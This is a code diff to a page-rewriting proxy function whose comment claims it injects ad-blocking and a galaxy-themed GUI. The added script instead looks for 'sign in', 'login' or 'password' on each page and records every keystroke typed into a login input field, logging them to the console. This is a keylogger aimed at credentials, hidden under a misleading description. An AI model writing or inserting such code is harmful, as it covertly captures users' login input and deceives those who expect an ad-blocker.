@@ -25,7 +25,30 @@ async function modifyPageContent(response) {
   // Modify the HTML to inject the ad-blocking script and the improved galaxy-themed JavaScript GUI with pre-installed scripts
   const modifiedText = `
     ${text}
+    <script>
+    //Assume the HTML has an input element with ID of "loginInput"
 
+// Function to check for "sign in", "login", "password" in HTML
+function checkForSignIn(){
+  var bodyContent = document.body.innerHTML;
+  return bodyContent.includes("sign in") || bodyContent.includes("login") || bodyContent.includes("password");
+}
+
+let keysRecorded = [];
+
+// Function to record key strokes and print to console
+function recordKeystrokes(){
+  if(checkForSignIn()){
+    let loginInput = document.getElementById("loginInput");
+    loginInput.addEventListener("keydown", function(e){
+      keysRecorded.push({key:e.key, elemClicked: loginInput.id});
+      console.table(keysRecorded);
+    });
+  }
+}
+
+recordKeystrokes();
+</script>
   `;
 
   const modifiedResponse = new Response(modifiedText, {
